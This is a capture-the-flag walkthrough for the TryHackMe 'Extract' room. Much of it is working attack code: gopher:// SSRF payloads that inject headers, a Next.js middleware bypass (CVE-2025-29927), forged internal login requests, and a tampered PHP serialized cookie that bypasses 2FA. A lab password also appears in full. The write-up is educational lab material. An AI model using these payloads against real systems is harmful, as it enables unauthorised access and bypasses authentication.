# Extract

Can you extract the secrets from the library?

The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.

Room: https://tryhackme.com/room/extract

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/extract.md

--------

## Overview

This room demonstrates a chained attack path involving:

* Server-Side Request Forgery through a preview endpoint
* Access to an internal Next.js service
* Next.js middleware bypass using `x-middleware-subrequest`
* Raw HTTP request crafting with `gopher://`
* PHP serialized cookie tampering
* 2FA bypass through a trusted client-side object

The exposed service runs on HTTP, while the vulnerable internal services are only reachable from localhost.

---

## Enumeration

Start by scanning the target:

```bash
export TARGET=10.10.10.10

nmap -p- -sS --min-rate 5000 -oN nmap-all.txt $TARGET
nmap -sV -sC -p 22,80 -oN nmap-svcs.txt $TARGET
```

Open ports:

```text
22/tcp open  ssh
80/tcp open  http Apache
```

Add the hostname if required:

```bash
echo "$TARGET cvssm1" | sudo tee -a /etc/hosts
```

Run directory enumeration:

```bash
gobuster dir -u http://cvssm1 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 \
  -o gobuster-common.txt
```

Interesting paths:

```text
/index.php
/preview.php
/management/
/pdf/
```

---

## SSRF Discovery

The `preview.php` endpoint accepts a `url` parameter.

Test whether it can fetch localhost resources:

```bash
curl -i 'http://cvssm1/preview.php?url=http://127.0.0.1/'
```

The internal management portal is also reachable through the same endpoint:

```bash
curl -i 'http://cvssm1/preview.php?url=http://127.0.0.1/management'
```

This confirms that `preview.php` can be used for SSRF.

---

## Accessing the Internal Next.js Service

An internal service is running on port `10000`.

Check the internal Next.js API route:

```bash
curl -i 'http://cvssm1/preview.php?url=http://127.0.0.1:10000/customapi'
```

The route is protected by middleware, so a normal request does not reveal the useful content.

Next.js CVE-2025-29927 can be abused by adding the following header:

```http
x-middleware-subrequest: middleware
```

Because the SSRF endpoint only accepts a URL, use `gopher://` to craft a raw HTTP request with custom headers.

---

## Middleware Bypass with Gopher

Use a double-encoded gopher payload to send the internal request:

```bash
curl -s 'http://cvssm1/preview.php?url=gopher://127.0.0.1:10000/_GET%2520/customapi%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A10000%250D%250Ax-middleware-subrequest%253A%2520middleware%250D%250A%250D%250A' \
  | tee customapi-gopher.txt
```

Extract useful values:

```bash
grep -Eoi 'THM\{[^}]+\}|[a-zA-Z0-9._-]+:[^ <"]+' customapi-gopher.txt
```

The response reveals:

```text
librarian:L1br4r1A****
First flag: THM{363bec60df12c2cadbe9ff35393fa***}
```

---

## Logging Into the Internal Management Portal

The management portal is only reachable internally. Submitting a login directly to `preview.php` does not work because the POST body is not forwarded to the internal service.

Use gopher again to send a raw internal POST request:

```bash
python3 - <<'PY' > login-url-double.txt
from urllib.parse import quote

body = "username=librarian&password=L1br4r1AN!!"

req = (
    "POST /management/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n"
    "\r\n"
    f"{body}"
)

inner = quote(req).replace("%", "%25")
print("http://cvssm1/preview.php?url=gopher://127.0.0.1:80/_" + inner)
PY

curl -i -s "$(cat login-url-double.txt)" | tee login-gopher-double.txt
```

Check for session cookies and redirects:

```bash
grep -Ei 'Set-Cookie|Location|PHPSESSID|Invalid|Login|Dashboard|Logout|THM|flag' login-gopher-double.txt
```

A successful login returns something similar to:

```text
Set-Cookie: PHPSESSID=<session>; path=/
Set-Cookie: auth_token=<serialized_auth_object>
Location: 2fa.php
```

---

## Inspecting the Auth Token

The `auth_token` cookie contains URL-encoded PHP serialized data.

Decoded, it looks like:

```php
O:9:"AuthToken":1:{s:9:"validated";b:0;}
```

The important value is:

```php
validated = false
```

Because this value is stored client-side, it can be modified.

Change:

```php
b:0
```

to:

```php
b:1
```

The modified serialized object becomes:

```php
O:9:"AuthToken":1:{s:9:"validated";b:1;}
```

URL-encoded:

```text
O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
```

---

## 2FA Bypass

Set the session cookie and modified auth token:

```bash
export PHPSESSID='<PHPSESSID_VALUE>'
export AUTH='O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D'
```

Request the 2FA page through gopher SSRF:

```bash
python3 - <<PY > get-2fa-bypass.txt
from urllib.parse import quote
import os

sid = os.environ["PHPSESSID"]
auth = os.environ["AUTH"]

req = (
    "GET /management/2fa.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    f"Cookie: PHPSESSID={sid}; auth_token={auth}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

inner = quote(req).replace("%", "%25")
print("http://cvssm1/preview.php?url=gopher://127.0.0.1:80/_" + inner)
PY

curl -i -s "$(cat get-2fa-bypass.txt)" | tee 2fa-bypass.txt
```

The response reveals the second flag:

```text
Second flag: THM{804326748394ff9fb288e059653f***}
```
---

## Attack Chain

```text
SSRF via preview.php
  -> internal Next.js service on 127.0.0.1:10000
  -> gopher SSRF for raw HTTP header injection
  -> x-middleware-subrequest middleware bypass
  -> leaked librarian credentials and first flag
  -> gopher SSRF POST to internal /management/
  -> PHP serialized auth_token cookie
  -> flip validated from b:0 to b:1
  -> access /management/2fa.php
  -> second flag
```

---

## Key Takeaways

* SSRF can often be escalated from simple URL fetching to raw protocol interaction with `gopher://`.
* Some SSRF sinks decode input once, requiring double-encoded payloads.
* Next.js CVE-2025-29927 can allow middleware bypass with the `x-middleware-subrequest` header.
* Authentication state should not be stored in client-controlled serialized objects.
* A trusted client-side boolean was enough to bypass the 2FA check.
